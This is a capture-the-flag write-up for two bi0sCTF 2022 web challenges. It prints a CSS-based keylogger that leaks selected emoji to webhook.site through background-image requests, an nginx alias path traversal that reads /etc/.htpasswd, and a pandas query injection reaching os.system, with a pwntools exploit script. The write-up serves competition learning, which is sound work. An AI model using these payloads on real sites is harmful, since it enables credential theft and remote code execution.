# bi0sCTF 2022

URL: https://ctf.bi0s.in/

Team: Kalmarunionen

Place: 7 (of 294)

## Challenge: Emo-Locker

> All new emoji-based authentication service. See if you can get the admin's emojis. 🥷

In `index.js` we see this change theme logic:

```jsx
class Main extends React.Component {
    constructor(props) {
        super(props);

        let link_obj = document.createElement("link");
        link_obj.rel = "stylesheet"
        this.state = {
            link_obj: link_obj
        };

        this.switchTheme = this.switchTheme.bind(this);
    }

    componentDidMount() {
        document.head.appendChild(this.state.link_obj);
        window.addEventListener("hashchange", this.switchTheme, false);
    }

    switchTheme() {
        this.setState((prevState) => {
            let href = `https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/${window.location.hash.replace("#", '')}-mode.css`;
            prevState.link_obj.href = href;
            return {}
        });
    }

	// ...
}
```

So we can load `http://web.chall.bi0s.in:10101/#dark` to get dark-mode.

But jsDelivr has a great feature for bypassing CSP/etc, which is the _CDN-for-any-GitHub_-feature:

> jsDelivr CDN service’s base URL is `https://cdn.jsdelivr.net/gh/{username}/{repo}/`, where you replace `{username}` with the GitHub username and `{repo}` with the repository name for the project.

So if I create repo 'hax' under my GitHub profile and add a file called 'a-mode.css', it can be loaded using: `http://web.chall.bi0s.in:10101/#../../gh/NicolaiSoeborg/hax/a`

I.e. `https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/../../gh/NicolaiSoeborg/hax/a-mode.css`

### CSS-based Keylogger

Normally one would do:

```css
input[type="password"][value$="bi0sctf{a"] {
  background-image: url("http://webhook.site/callback?data=a");
}
input[type="password"][value$="bi0sctf{b"] {
  background-image: url("http://webhook.site/callback?data=b");
}
input[type="password"][value$="bi0sctf{c"] {
  background-image: url("http://webhook.site/callback?data=c");
}
/* ... */
```

But in this case the password input field is replaced with `*` and the secret emoji sequence is stored in a local state.
When an emoji is selected, the corresponding HTML element is cleared so the emoji can only be picked once. We can use the CSS selector `:empty` to find these elements, i.e. `span[role="img"][aria-label="1"]` is the first emoji and `span[role="img"][aria-label="1"]:empty` is the selector for when the emoji is picked.

Using this we change the `a-mode.css` file to:

```css
span[role="img"][aria-label="1"]:empty { background-image: url("https://webhook.site/cb…61?data=1"); }
span[role="img"][aria-label="2"]:empty { background-image: url("https://webhook.site/cb…61?data=2"); }
span[role="img"][aria-label="3"]:empty { background-image: url("https://webhook.site/cb…61?data=3"); }
span[role="img"][aria-label="4"]:empty { background-image: url("https://webhook.site/cb…61?data=4"); }
span[role="img"][aria-label="5"]:empty { background-image: url("https://webhook.site/cb…61?data=5"); }
span[role="img"][aria-label="6"]:empty { background-image: url("https://webhook.site/cb…61?data=6"); }
span[role="img"][aria-label="7"]:empty { background-image: url("https://webhook.site/cb…61?data=7"); }
/* ... */
```

And watch the requests coming in whenever an emoji is selected.
The secret sequence is "51,32,73,34,85,126,17,158,79,50" (😔 🫢 😕🤫😧🙊🤩💬😯😌) which we can use to login ourself and get the flag: `bi0sctf{a34522e2009192570c840f931e4c3c0a}`

## Challenge: PyCGI

> Hope its working. Can you check?

We get the following nginx config (simplified):

```nginx
http {
    sendfile        on;

    server {
        listen       8000;
        server_name  localhost;

        location / {
                autoindex on;
                root /panda/;
        }

        location /cgi-bin/ {
                gzip off;
                auth_basic           "Admin Area";
                auth_basic_user_file /etc/.htpasswd;

                include fastcgi_params;
                fastcgi_param SCRIPT_FILENAME /panda/$fastcgi_script_name;
        }

        location /static {
                alias /static/; 
        }
    }
}
```

We see that it has a common misconfiguration: the `alias` block is missing a tailing slash in the location specifier!
This means we can request `http://instance.chall.bi0s.in:10438/static../etc/.htpasswd` which isn't normalized so we can fetch files 'one dir up', luckily a dir up is the root, so we can fetch `/etc/.htpasswd`.

The password hash stored in .htpasswd is: `admin:$apr1$usrUW0sL$XToLdRz.YCRy5TCvpI8UK0`. Initially we could not crack it, but my teammate spotted something odd in `/docker-entrypoint.sh`:

```bash
mv flag.txt $(head /dev/urandom | shasum | cut -d' ' -f1)

htpasswd -mbc /etc/.htpasswd admin Â­

spawn-fcgi -s /var/run/fcgiwrap.socket -M 766 /usr/sbin/fcgiwrap 

/usr/sbin/nginx

while true; do sleep 1; done
```

What is that weird Â? It is the password! (non-printable in my terminal). Byte sequence: `\xc2\xad`.

Status so far:
 * We can read arbitrary files due to nginx misconfiguration
 * We can run scripts in `cgi-bin/` with Basic Authentication
 * Flag has a randomized filename, so we need RCE to get it

### CGI scripts

In the cgi-bin folder we see a script called `search_currency.py`:

```python
from server import Server
import pandas as pd

try:
    df = pd.read_csv("../database/currency-rates.csv")
    server = Server()
    server.set_header("Content-Type", "text/html")
    params = server.get_params()
    assert "currency_name" in params
    currency_code = params["currency_name"]
    results = df.query(f"currency == '{currency_code}'")
    server.add_body(results.to_html())
    server.send_response()
except Exception as e:
    print("Content-Type: text/html")
    print()
    print("Exception")
    print(str(e))
```

It uses a very simple home-made python server to serve requests.
We can send a `currency_code` parameter which will be injected directly to a `DataFrame.query` statement.

Underneath the hood, `.query` uses `pandas.eval` which some people believe is safe:

> "`pandas.eval` is not as dangerous as it sounds. Unlike python’s eval `pandas.eval` cannot execute arbitrary functions.

But this is not true!
We can use `@` to reference local variables, so e.g. this would work:

```python
import os

currency_code = "DKK' or @os.system('ls') or '1' == '1"
df.query(f"currency == '{currency_code}'")
```

But we don't have `os` imported as a local variables :/
Instead we can try with reflections:
 * `@df.__class__.__init__.__globals__['__builtins__']['exec']('import os; os.system("ls")')`

Or even better, my teammate also found this short path to `os`:
 * `@pd.io.common.os.system('ls')`

Finally we needed to make a raw HTTP request because the server didn't URL decode parameters.
Exploit is:

```python
from pwn import *

io = remote("instance.chall.bi0s.in", 10889, level="debug")
io.send(b"""\
GET /cgi-bin/search_currency.py?currency_name={}'.format(@pd.io.common.os.system('ls /'))# HTTP/1.1
Host: instance.chall.bi0s.in:10889
Authorization: Basic YWRtaW46wq0=

""")

io.interactive()
```

This turns: `df.query(f"currency == '{currency_code}'")` into `df.query(f"currency == '{}'.format(@pd.io.common.os.system('ls /'))#'")`.

Flag: `bi0sctf{9a18559a42e7302b15eeb45c09ab39d6}`
